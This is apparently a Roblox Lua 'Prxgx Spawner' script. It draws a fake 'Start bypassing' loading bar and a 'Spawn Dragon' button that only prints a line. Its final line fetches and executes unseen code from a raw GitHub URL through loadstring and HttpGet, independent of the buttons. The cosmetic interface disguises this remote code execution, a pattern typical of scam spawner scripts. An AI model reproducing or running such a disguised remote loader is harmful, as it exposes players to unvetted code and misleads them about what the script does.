--// Prxgx Styled UI (Improved)

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PrxgxUI"

--// LOADING FRAME
local loading = Instance.new("Frame", gui)
loading.Size = UDim2.new(0, 360, 0, 190)
loading.Position = UDim2.new(0.5, -180, 0.5, -95)
loading.BackgroundColor3 = Color3.fromRGB(10,10,10)
loading.BorderSizePixel = 0
Instance.new("UICorner", loading).CornerRadius = UDim.new(0, 18)

-- Title
local title = Instance.new("TextLabel", loading)
title.Size = UDim2.new(1,0,0,50)
title.BackgroundTransparency = 1
title.Text = "Prxgx Scripts"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextScaled = true

-- Progress Bar BG
local barBG = Instance.new("Frame", loading)
barBG.Size = UDim2.new(0.8,0,0,18)
barBG.Position = UDim2.new(0.1,0,0.4,0)
barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
barBG.BorderSizePixel = 0
Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)

-- Progress Bar Fill
local bar = Instance.new("Frame", barBG)
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(0,120,255)
bar.BorderSizePixel = 0
Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

-- Status Text
local status = Instance.new("TextLabel", loading)
status.Size = UDim2.new(1,0,0,30)
status.Position = UDim2.new(0,0,0.6,0)
status.BackgroundTransparency = 1
status.Text = "Waiting..."
status.TextColor3 = Color3.fromRGB(200,200,200)
status.Font = Enum.Font.Gotham
status.TextScaled = true

-- Start Button
local startBtn = Instance.new("TextButton", loading)
startBtn.Size = UDim2.new(0.6,0,0,40)
startBtn.Position = UDim2.new(0.2,0,0.75,0)
startBtn.Text = "Start bypassing"
startBtn.Font = Enum.Font.GothamBold
startBtn.TextScaled = true
startBtn.TextColor3 = Color3.new(1,1,1)
startBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
startBtn.BorderSizePixel = 0
Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0,12)

-- Click to start loading
startBtn.MouseButton1Click:Connect(function()
	startBtn.Visible = false
	status.Text = "Initializing..."

	for i = 1,100 do
		bar.Size = UDim2.new(i/100,0,1,0)
		status.Text = "Loading "..i.."%"
		task.wait(0.04) -- 🔥 slower loading (increase for more slow)
	end

	task.wait(0.5)
	loading:Destroy()

	--// MAIN UI
	local main = Instance.new("Frame", gui)
	main.Size = UDim2.new(0, 260, 0, 120)
	main.Position = UDim2.new(0.5, -130, 0.5, -60)
	main.BackgroundColor3 = Color3.fromRGB(10,10,10)
	main.BorderSizePixel = 0
	main.Active = true
	main.Draggable = true
	Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)

	-- Title
	local mainTitle = Instance.new("TextLabel", main)
	mainTitle.Size = UDim2.new(1,0,0,40)
	mainTitle.BackgroundTransparency = 1
	mainTitle.Text = "Prxgx Spawner"
	mainTitle.TextColor3 = Color3.new(1,1,1)
	mainTitle.Font = Enum.Font.GothamBold
	mainTitle.TextScaled = true

	-- Spawn Button
	local spawnBtn = Instance.new("TextButton", main)
	spawnBtn.Size = UDim2.new(0.8,0,0,40)
	spawnBtn.Position = UDim2.new(0.1,0,0.5,0)
	spawnBtn.Text = "Spawn Dragon"
	spawnBtn.Font = Enum.Font.Gotham
	spawnBtn.TextScaled = true
	spawnBtn.TextColor3 = Color3.new(1,1,1)
	spawnBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
	spawnBtn.BorderSizePixel = 0
	Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0,12)

	spawnBtn.MouseButton1Click:Connect(function()
		print("Spawn Dragon clicked")
	end)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/DragonEastSpawner.lua"))()
